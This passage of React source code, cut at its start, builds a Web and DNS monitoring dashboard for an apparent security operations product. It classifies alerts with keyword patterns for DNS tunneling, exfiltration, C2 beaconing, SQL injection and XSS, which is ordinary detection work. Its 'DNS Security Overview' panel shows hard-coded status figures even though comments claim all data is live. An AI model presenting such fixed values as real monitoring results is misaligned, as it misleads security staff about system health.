      <div style={{ ...panel, padding: 10 }}><b style={{ fontSize: 11 }}>Web Traffic by Category</b><div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-around', gap: 16, height: 105 }}><div style={{ width: 80, height: 80, flexShrink: 0, borderRadius: '50%', background: conicFor(webCategoryCounts), display: 'grid', placeItems: 'center' }}><div style={{ width: 48, height: 48, borderRadius: '50%', background: '#0d2035', display: 'grid', placeItems: 'center', fontSize: 10, fontWeight: 900 }}>{webChartTotal}</div></div><div style={{ minWidth: 125 }}>{webCategoryCounts.map(([name,count,color]) => <div key={name} style={{ display:'flex',justifyContent:'space-between',gap:12,padding:'3px 0',fontSize:8 }}><span><i style={{display:'inline-block',width:6,height:6,borderRadius:6,background:color,marginRight:5}} />{name}</span><b style={{color}}>{Number(count || 0).toLocaleString()}</b></div>)}</div></div></div>
      <div style={{ ...panel, padding: 10 }}><b style={{ fontSize: 11 }}>DNS Query Types</b><div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-around', gap: 16, height: 105 }}><div style={{ width: 80, height: 80, flexShrink: 0, borderRadius: '50%', background: conicFor(dnsTypeCounts), display: 'grid', placeItems: 'center' }}><div style={{ width: 48, height: 48, borderRadius: '50%', background: '#0d2035', display: 'grid', placeItems: 'center', fontSize: 10, fontWeight: 900 }}>{dnsChartTotal}</div></div><div style={{ minWidth: 95 }}>{dnsTypeCounts.map(([name,count,color]) => <div key={name} style={{ display:'flex',justifyContent:'space-between',gap:12,padding:'2px 0',fontSize:8 }}><span><i style={{display:'inline-block',width:6,height:6,borderRadius:6,background:color,marginRight:5}} />{name}</span><b style={{color}}>{Number(count || 0).toLocaleString()}</b></div>)}</div></div></div>
      <div style={{ ...panel, padding: 10 }}><b style={{ fontSize: 11 }}>DNS Security Overview</b><div style={{ display: 'flex', alignItems: 'center', gap: 25, height: 105 }}><div style={{ color: MON.green, textAlign: 'center', fontSize: 34 }}>♜<div style={{ fontSize: 10, fontWeight: 900 }}>Protected</div></div><div style={{ flex: 1 }}>{[['DNS Servers','5 / 5 Up'],['DNS Response Time','23 ms'],['Failed Lookups','0.18%'],['DNSSEC Validation','Enabled'],['Threat Feeds','Connected']].map(([a,b]) => <div key={a} style={{ display:'flex',justifyContent:'space-between',fontSize:8,padding:3 }}><span style={{color:MON.muted}}>{a}</span><span style={{color:MON.green}}>{b} ●</span></div>)}</div></div></div>
    </div>
  </div>;
}

export default function WebDnsDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const [activeTab, setActiveTab] = useState('dashboard');

  // All stats computed from real API data — exact Alert.model.js field names
  const liveStats = useMemo(() => {
    const active = alerts.length;

    // `blocked` boolean field in schema — or actionTaken === 'Blocked'
    const blocked = alerts.filter(a =>
      a.blocked === true ||
      a.actionTaken === 'Blocked' ||
      a.containmentStatus === 'blocked'
    ).length;

    // DNS Tunneling — ruleId or description must explicitly say so
    const tunneling = alerts.filter(a =>
      /dns.?tunnel|tunneling|high.?entropy|subdomain.?exfil/i.test(
        `${a.description || ''} ${a.ruleId || ''} ${a.signatureName || ''}`
      )
    ).length;

    // Beaconing — beacon keyword in rule/description
    const beaconing = alerts.filter(a =>
      /beacon|c2.?beac|command.?control/i.test(
        `${a.description || ''} ${a.ruleId || ''} ${a.signatureName || ''}`
      )
    ).length;

    // Malicious — schema has tiDomainMalicious flag + explicit keywords
    const malicious = alerts.filter(a =>
      a.tiDomainMalicious === true ||
      /malicious|phishing|malware|ransomware/i.test(
        `${a.description || ''} ${a.threatCategory || ''} ${a.malwareType || ''}`
      )
    ).length;

    // C2 — explicit C2 in rule/description
    const c2 = alerts.filter(a =>
      /\bc2\b|command.?and.?control|c2.?server/i.test(
        `${a.description || ''} ${a.ruleId || ''} ${a.signatureName || ''}`
      )
    ).length;

    // Web attacks — WAF-specific
    const attacks = alerts.filter(a =>
      /sql.?inject|sqli|xss|cross.?site|path.?travers|lfi|rfi|waf|web.?attack/i.test(
        `${a.description || ''} ${a.ruleId || ''} ${a.signatureName || ''}`
      )
    ).length;

    const phishing = alerts.filter(a => /phishing/i.test(`${a.description || ''} ${a.threatCategory || ''} ${a.ruleId || ''}`)).length;
    const sinkhole = alerts.filter(a => /sinkhole/i.test(`${a.description || ''} ${a.ruleId || ''} ${a.actionTaken || ''}`)).length;
    const cachePoisoning = alerts.filter(a => /cache.?poison|dns.?poison/i.test(`${a.description || ''} ${a.ruleId || ''} ${a.eventType || ''}`)).length;
    const dnsQueries = alerts.filter(a => {
      const raw = a?.rawEvent?.raw || a?.rawEvent || {};
      return Boolean(a.domain || a.dnsQuery || a.queryType || raw.domain || raw.qname || /\bdns\b/i.test(`${a.type || ''} ${a.eventType || ''} ${a.description || ''}`));
    }).length;
    const webRequests = alerts.filter(a => {
      const raw = a?.rawEvent?.raw || a?.rawEvent || {};
      return Boolean(a.domain || a.dnsQuery || raw.domain || raw.qname
        || a.url || a.targetUrl || a.httpMethod || raw.url || raw.http_method
        || /http|web|waf/i.test(`${a.type || ''} ${a.eventType || ''} ${a.description || ''}`));
    }).length;
    const sqliAttacks = alerts.filter(a => /sql.?inject|\bsqli\b/i.test(`${a.description || ''} ${a.ruleId || ''} ${a.signatureName || ''}`)).length;
    const xssAttacks = alerts.filter(a => /\bxss\b|cross.?site.?script/i.test(`${a.description || ''} ${a.ruleId || ''} ${a.signatureName || ''}`)).length;
    const apiAbuse = alerts.filter(a => /api.?abuse|api.?attack|rate.?limit|graphql|rest.?api/i.test(`${a.description || ''} ${a.ruleId || ''} ${a.signatureName || ''}`)).length;
    const endpointKeys = new Set(alerts.map(a => a.systemId?._id || a.systemId || a.agentId || a.agentName || a.hostname).filter(Boolean));
    const serverKeys = new Set(alerts.filter(a => /server|nginx|apache|iis|waf/i.test(`${a.assetType || ''} ${a.agentName || ''} ${a.hostname || ''} ${a.description || ''}`)).map(a => a.systemId?._id || a.systemId || a.hostname || a.agentName).filter(Boolean));
    const agentKeys = new Set(alerts.map(a => a.agentId || a.agentKey || a.agentName || a.systemId?._id || a.systemId).filter(Boolean));

    const criticalAlerts = alerts.filter(a => a.severity === 'critical').length;
    const highAlerts     = alerts.filter(a => a.severity === 'high').length;
    const mediumAlerts   = alerts.filter(a => a.severity === 'medium').length;
    const lowAlerts      = alerts.filter(a => a.severity === 'low').length;

    // Threat score from severity distribution
    const threatScore = active > 0
      ? Math.min(100, Math.round((criticalAlerts * 10 + highAlerts * 5 + mediumAlerts * 2 + lowAlerts) / (active || 1) * 10))
      : 0;

    return {
      webRequests,
      dnsQueries,
      blockedRequests:  blocked,
      blockedDomains:   blocked,
      maliciousUrls:    malicious,
      phishingUrls:     phishing,
      dnsTunneling:     tunneling,
      dnsBeaconing:     beaconing,
      c2Comms:          c2,
      sinkholeHits:     sinkhole,
      cachePoisoning,
      webAttacks:       attacks,
      sqliAttacks,
      xssAttacks,
      apiAbuse,
      criticalAlerts,
      highAlerts,
      mediumAlerts,
      lowAlerts,
      activeEndpoints:  endpointKeys.size,
      activeServers:    serverKeys.size,
      onlineAgents:     agentKeys.size,
      threatScore,
    };
  }, [alerts, total]);

  const liveHourlyBuckets = useMemo(() => {
    const buckets = Array(12).fill(0);
    const now = Date.now();
    alerts.forEach(a => {
      const time = new Date(a.createdAt || a.timestamp || a.rawEvent?.timestamp || 0).getTime();
      const hoursAgo = Math.floor((now - time) / 3600000);
      if (Number.isFinite(hoursAgo) && hoursAgo >= 0 && hoursAgo < buckets.length) buckets[buckets.length - 1 - hoursAgo]++;
    });
    return buckets;
  }, [alerts]);

  // Every sparkline uses real timestamp buckets; zero-value metrics stay flat.
  const spark = val => (!val || Number(val) === 0 ? Array(liveHourlyBuckets.length).fill(0) : liveHourlyBuckets);

  const kpis = [
    { label: 'Total Web Requests', val: liveStats.webRequests.toLocaleString(), color: MON.blue, data: spark(liveStats.webRequests) },
    { label: 'Total DNS Queries', val: liveStats.dnsQueries.toLocaleString(), color: MON.cyan, data: spark(liveStats.dnsQueries) },
    { label: 'Blocked Requests', val: liveStats.blockedRequests, color: MON.red, data: spark(liveStats.blockedRequests) },
    { label: 'Blocked Domains', val: liveStats.blockedDomains, color: MON.orange, data: spark(liveStats.blockedDomains) },
    { label: 'Malicious URLs', val: liveStats.maliciousUrls, color: MON.red, data: spark(liveStats.maliciousUrls) },
    { label: 'Phishing URLs', val: liveStats.phishingUrls, color: MON.red, data: spark(liveStats.phishingUrls) },
    { label: 'DNS Tunneling', val: liveStats.dnsTunneling, color: MON.orange, data: spark(liveStats.dnsTunneling) },
    { label: 'DNS Beaconing', val: liveStats.dnsBeaconing, color: MON.orange, data: spark(liveStats.dnsBeaconing) },
    { label: 'C2 Communications', val: liveStats.c2Comms, color: MON.red, data: spark(liveStats.c2Comms) },
    { label: 'DNS Sinkhole Hits', val: liveStats.sinkholeHits, color: MON.purple, data: spark(liveStats.sinkholeHits) },
    { label: 'Cache Poisoning', val: liveStats.cachePoisoning, color: MON.yellow, data: spark(liveStats.cachePoisoning) },
    { label: 'Web Attacks (WAF)', val: liveStats.webAttacks, color: MON.red, data: spark(liveStats.webAttacks) },
    { label: 'SQL Injection', val: liveStats.sqliAttacks, color: MON.orange, data: spark(liveStats.sqliAttacks) },
    { label: 'XSS Attacks', val: liveStats.xssAttacks, color: MON.yellow, data: spark(liveStats.xssAttacks) },
    { label: 'API Abuse', val: liveStats.apiAbuse, color: MON.purple, data: spark(liveStats.apiAbuse) },
    { label: 'Critical Alerts', val: liveStats.criticalAlerts, color: MON.red, data: spark(liveStats.criticalAlerts) },
    { label: 'High Alerts', val: liveStats.highAlerts, color: MON.orange, data: spark(liveStats.highAlerts) },
    { label: 'Medium Alerts', val: liveStats.mediumAlerts, color: MON.yellow, data: spark(liveStats.mediumAlerts) },
    { label: 'Low Alerts', val: liveStats.lowAlerts, color: MON.green, data: spark(liveStats.lowAlerts) },
    { label: 'Observed Endpoints', val: liveStats.activeEndpoints, color: MON.blue, data: spark(liveStats.activeEndpoints) },
    { label: 'Observed Web Servers', val: liveStats.activeServers, color: MON.cyan, data: spark(liveStats.activeServers) },
    { label: 'Observed Agents', val: liveStats.onlineAgents, color: MON.green, data: spark(liveStats.onlineAgents) },
    { label: 'Threat Score', val: `${liveStats.threatScore}/100`, color: liveStats.threatScore > 70 ? MON.red : liveStats.threatScore > 40 ? MON.yellow : MON.green, data: spark(liveStats.threatScore) },
  ];

  return (
    <div style={{ background: MON.bg, color: MON.text, display: 'flex', height: '100%', minHeight: 0, overflow: 'hidden' }}>
      <aside style={{ width: 235, flexShrink: 0, background: MON.card2, borderRight: `1px solid ${MON.border}`, padding: 14, display: 'flex', flexDirection: 'column', gap: 8 }}>
        {[
          { id: 'dashboard', icon: '📊', label: 'Dashboard', activeColor: MON.blue },
          { id: 'monitoring', icon: '📊', label: 'Monitoring', activeColor: MON.cyan },
          { id: 'log-monitor', icon: '📜', label: 'Logs (SIEM Table)', activeColor: MON.cyan },
          { id: 'reports', icon: '📄', label: 'Reports', activeColor: MON.purple },
        ].map(item => {
          const selected = activeTab === item.id;
          return (
            <button
              key={item.id}
              type="button"
              onClick={() => setActiveTab(item.id)}
              aria-current={selected ? 'page' : undefined}
              style={{
                width: '100%', display: 'flex', alignItems: 'center', gap: 10,
                background: selected ? item.activeColor : 'transparent',
                color: selected ? (item.id === 'reports' ? '#fff' : '#000') : MON.text,
                border: selected ? `1px solid ${item.activeColor}` : '1px solid transparent',
                padding: '10px 12px', borderRadius: 7, fontSize: 12, fontWeight: 800,
                textAlign: 'left', cursor: 'pointer',
              }}
            >
              <span aria-hidden="true">{item.icon}</span>
              <span>{item.label}</span>
            </button>
          );
        })}
      </aside>

      <main style={{ flex: 1, minWidth: 0, padding: 16, display: 'flex', flexDirection: 'column', gap: 16, overflowY: 'auto' }}>

      {activeTab === 'log-monitor' ? (
        <WebDnsLogMonitor alerts={alerts} />
      ) : activeTab === 'reports' ? (
        <WebDnsReportsTab alerts={alerts} />
      ) : activeTab === 'dashboard' ? (
        <WebDnsOverviewDashboard alerts={alerts} stats={liveStats} onOpenLogs={() => setActiveTab('log-monitor')} />
      ) : (
        <>
          {/* Top 23 KPI Cards Grid */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 12 }}>
            {kpis.map((kpi, i) => (
              <div key={i} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 12, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                  <div style={{ fontSize: 11, fontWeight: 700, color: MON.muted }}>{kpi.label}</div>
                  {/* No static trend badge — only live data */}
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', marginTop: 10 }}>
                  <div style={{ fontSize: 20, fontWeight: 900, color: kpi.color }}>{kpi.val}</div>
                  <div style={{ width: 65 }}><MiniSparkline data={kpi.data} color={kpi.color} height={22} /></div>
                </div>
              </div>
            ))}
          </div>

          {/* Charts Row — fully driven by real alert data */}
          {(() => {
            // Build hourly buckets for 24h timeline from real alerts
            const hourBuckets = Array(18).fill(0);
            const now = Date.now();
            alerts.forEach(a => {
              const t = new Date(a.createdAt || a.timestamp || now).getTime();
              const hoursAgo = Math.floor((now - t) / 3600000);
              const idx = Math.max(0, Math.min(17, 17 - hoursAgo));
              hourBuckets[idx]++;
            });
            const maxBucket = Math.max(...hourBuckets, 1);

            // Build top domains from real alerts
            const domainCount = {};
            alerts.forEach(a => {
              const d = a.domain || a.url || a.targetUrl || a.host || a.dstHost || '';
              if (d && d !== '—' && d.length > 3) {
                domainCount[d] = (domainCount[d] || 0) + 1;
              }
            });
            const topDomains = Object.entries(domainCount)
              .sort((x, y) => y[1] - x[1])
              .slice(0, 5);

            // Build severity breakdown for server stack panel
            const sevBreakdown = [
              { label: 'Critical Alerts', count: alerts.filter(a => a.severity === 'critical').length, color: MON.red },
              { label: 'High Alerts',     count: alerts.filter(a => a.severity === 'high').length,     color: MON.orange },
              { label: 'Medium Alerts',   count: alerts.filter(a => a.severity === 'medium').length,   color: MON.yellow },
              { label: 'Low Alerts',      count: alerts.filter(a => a.severity === 'low').length,      color: MON.green },
            ].filter(s => s.count > 0);
            const sevTotal = sevBreakdown.reduce((s, x) => s + x.count, 0);

            return (
              <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr 1fr', gap: 14 }}>
                {/* 24h Timeline */}
                <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>📊 Alerts 24h Timeline</div>
                  <div style={{ height: 140, display: 'flex', alignItems: 'flex-end', gap: 3, borderBottom: `1px solid ${MON.line}` }}>
                    {hourBuckets.map((val, idx) => (
                      <div key={idx} style={{ flex: 1, height: `${Math.max((val / maxBucket) * 100, val > 0 ? 4 : 0)}%`, background: MON.cyan, borderRadius: '2px 2px 0 0', minHeight: val > 0 ? 3 : 0 }} />
                    ))}
                  </div>
                  {alerts.length === 0 && (
                    <div style={{ textAlign: 'center', color: MON.sub, fontSize: 11, marginTop: 8 }}>No events in last 24h</div>
                  )}
                </div>

                {/* Top Domains */}
                <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>🌐 Top Active Domains</div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 11 }}>
                    {topDomains.length === 0 ? (
                      <div style={{ color: MON.sub, fontSize: 11, textAlign: 'center', marginTop: 20 }}>No domain data available</div>
                    ) : (
                      topDomains.map(([dom, cnt], i) => {
                        const colors = [MON.red, MON.orange, MON.yellow, MON.cyan, MON.purple];
                        return (
                          <div key={dom} style={{ display: 'flex', justifyContent: 'space-between', gap: 8 }}>
                            <span style={{ color: MON.text, fontWeight: 700, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '75%' }} title={dom}>{dom}</span>
                            <span style={{ color: colors[i] || MON.blue, fontWeight: 800, flexShrink: 0 }}>{cnt} alerts</span>
                          </div>
                        );
                      })
                    )}
                  </div>
                </div>

                {/* Severity Breakdown */}
                <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>⚡ Severity Breakdown</div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 11 }}>
                    {sevBreakdown.length === 0 ? (
                      <div style={{ color: MON.sub, fontSize: 11, textAlign: 'center', marginTop: 20 }}>No alert data available</div>
                    ) : (
                      sevBreakdown.map(s => (
                        <div key={s.label}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                            <span style={{ color: MON.muted }}>{s.label}</span>
                            <span style={{ color: s.color, fontWeight: 800 }}>{s.count} ({sevTotal > 0 ? Math.round(s.count / sevTotal * 100) : 0}%)</span>
                          </div>
                          <div style={{ height: 4, background: MON.card2, borderRadius: 2 }}>
                            <div style={{ height: '100%', width: `${sevTotal > 0 ? (s.count / sevTotal * 100) : 0}%`, background: s.color, borderRadius: 2, transition: 'width 0.4s ease' }} />
                          </div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              </div>
            );
          })()}
        </>
      )}
      </main>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 5. OVERLAY CAPABILITY MODAL EXPORT (2-SECOND REALTIME STREAMING LINKED)
// ═════════════════════════════════════════════════════════════════════════════
export function CapabilityPage() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { company, user } = useAuth();
  const fromDashboard = searchParams.get('from') === 'dashboard';
  const companyId = company?._id || user?.companyId?._id || user?.companyId;

  const [alerts, setAlerts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [total, setTotal] = useState(0);

  const loadAlerts = useCallback(async (quiet = false) => {
    if (!quiet) setLoading(true);
    try {
      const capabilityId = 9;
      const limit = 250;
      const fetchAllPages = async (path) => {
        const allAlerts = [];
        let total = 0;
        let page = 1;
        while (page <= 20) {
          const q = new URLSearchParams({ page, limit, capabilityId, windowHours: 24 });
          const res = await api.get(`${path}?${q}`);
          const pageAlerts = res.data?.alerts || [];
          if (page === 1) total = Number(res.data?.total || pageAlerts.length || 0);
          allAlerts.push(...pageAlerts);
          if (pageAlerts.length < limit) break;
          page += 1;
        }
        return { alerts: allAlerts, total };
      };

      let fetchedAlerts = [];
      let fetchedTotal = 0;
      try {
        // Keep the standalone capability page aligned with the company-admin
        // card and EDR modal: Web & DNS belongs to the network alert stream.
        const res = await fetchAllPages('/dashboard/alerts/network');
        fetchedAlerts = res.alerts;
        fetchedTotal = res.total;
      } catch (e) { /* ignore */ }

      setAlerts(fetchedAlerts);
      setTotal(fetchedTotal || fetchedAlerts.length);
    } catch (err) {
      console.warn('[WebDNS Fetch Warning]', err);
    } finally {
      if (!quiet) setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadAlerts(false);
    const interval = setInterval(() => loadAlerts(true), 30000);
    return () => clearInterval(interval);
  }, [loadAlerts]);

  useEffect(() => {
    const socket = io(SOCKET_URL, { ...socketOptions, transports: ['polling', 'websocket'] });
    const join = () => { if (companyId) socket.emit('join:company', companyId); };
    socket.on('connect', join);
    socket.on('alert:new', (newAlert) => {
      if (newAlert) {
        setAlerts(prev => [newAlert, ...prev]);
      }
      loadAlerts(true);
    });
    socket.on('webdns:event', (newAlert) => {
      if (newAlert) {
        setAlerts(prev => [newAlert, ...prev]);
      }
      loadAlerts(true);
    });
    socket.on('telemetry:new', () => loadAlerts(true));
    join();
    const disc = connectSocket(socket);
    return () => {
      socket.off('connect', join);
      socket.off('alert:new');
      socket.off('webdns:event');
      socket.off('telemetry:new');
      disc();
    };
  }, [companyId, loadAlerts]);

  const handleClose = () => navigate(fromDashboard ? '/' : '/edr', { replace: true });

  return (
    <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000 }} onClick={e => { if (e.target === e.currentTarget) handleClose(); }}>
      <div style={{ background: '#0c1a2e', border: '1px solid #1e3a5f', borderRadius: 12, width: 'calc(100vw - 8px)', height: 'calc(100vh - 8px)', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 18px', borderBottom: '1px solid #1e3a5f', flexShrink: 0 }}>
          <h3 style={{ margin: 0, fontSize: 15, color: '#e0f2fe' }}>🛡️ 9. Web & DNS Monitoring</h3>
          <button type="button" onClick={handleClose} style={{ background: 'none', border: 'none', color: '#60a5fa', fontSize: 20, cursor: 'pointer' }}>✕</button>
        </div>
        <WebDnsDashboardPanel alerts={alerts} loading={loading} total={total} />
      </div>
    </div>
  );
}

export function WebDnsSubTabPage() {
  return <CapabilitySubTabPage kind="webdns" />;
}
